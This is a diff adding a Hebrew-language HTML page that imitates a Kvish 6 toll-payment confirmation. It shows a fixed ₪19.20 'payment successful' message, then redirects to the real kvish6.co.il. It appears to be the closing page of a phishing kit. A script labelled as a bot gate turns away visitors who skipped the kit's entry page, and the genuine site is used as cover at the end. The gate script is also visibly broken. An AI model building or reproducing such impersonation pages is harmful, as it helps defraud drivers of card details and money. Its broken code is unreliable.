@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>תשלום הושלם בהצלחה - כביש 6</title>
+    <script>
+        // Require that the user passed through index.htm (very basic JS bot gate)
+        (function () {
+            try {
+                    window.location.href = "./index.htm";
+                }
+            } catch (e) {
+                window.location.href = "./index.htm";
+            }
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica', sans-serif;
+            background: url('assets/already-have-a-user.jpeg') center/cover no-repeat fixed;
+            position: relative;
+            min-height: 100vh;
+            color: #2c3e50;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 0;
+        }
+
+        .success-box {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 60px 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-badge {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #28a745, #20c997);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.4);
+            }
+            70% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 20px rgba(40, 167, 69, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0);
+            }
+        }
+
+        .success-badge::before {
+            content: '✓';
+            font-size: 60px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .success-heading {
+            font-size: 32px;
+            font-weight: 700;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+
+        .success-msg {
+            font-size: 18px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .pay-details {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .pay-sum {
+            font-size: 24px;
+            font-weight: 600;
+            color: #2a5298;
+            margin-bottom: 10px;
+        }
+
+        .pay-date {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .timer {
+            font-size: 16px;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .timer-num {
+            font-weight: 600;
+            color: #2a5298;
+            font-size: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .success-box {
+                padding: 40px 20px;
+                margin: 20px;
+            }
+            
+            .success-badge {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .success-badge::before {
+                font-size: 50px;
+            }
+            
+            .success-heading {
+                font-size: 28px;
+            }
+            
+            .success-msg {
+                font-size: 16px;
+            }
+            
+            .pay-sum {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .success-box {
+                padding: 30px 15px;
+            }
+            
+            .success-badge {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .success-badge::before {
+                font-size: 40px;
+            }
+            
+            .success-heading {
+                font-size: 24px;
+            }
+            
+            .success-msg {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="success-box">
+        <div class="success-badge"></div>
+        
+        <h1 class="success-heading">תשלום הושלם בהצלחה!</h1>
+        
+        <p class="success-msg">
+            התשלום שלך עבר בהצלחה. תודה על השימוש בשירותי כביש 6.
+        </p>
+        
+        <div class="pay-details">
+            <div class="pay-sum">₪ 19.20</div>
+            <div class="pay-date" id="paymentDate"></div>
+        </div>
+        
+        <div class="timer">
+            מפנה לדף הבית בעוד <span class="timer-number" id="timer">5</span> שניות
+        </div>
+    </div>
+
+    <script>
+        // Set current date
+        const now = new Date();
+        const dateString = now.toLocaleDateString('he-IL', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit'
+        });
+        document.getElementById('paymentDate').textContent = `תאריך תשלום: ${dateString}`;
+
+        // Countdown timer
+        let timeLeft = 5;
+        const countdownElement = document.getElementById('timer');
+        
+        function updateCountdown() {
+            countdownElement.textContent = timeLeft;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                // Redirect to external website
+                window.location.href = "https://www.kvish6.co.il";
+            }
+        }
+        
+        // Start countdown
+        updateCountdown();
+    </script>
+</body>
+</html>
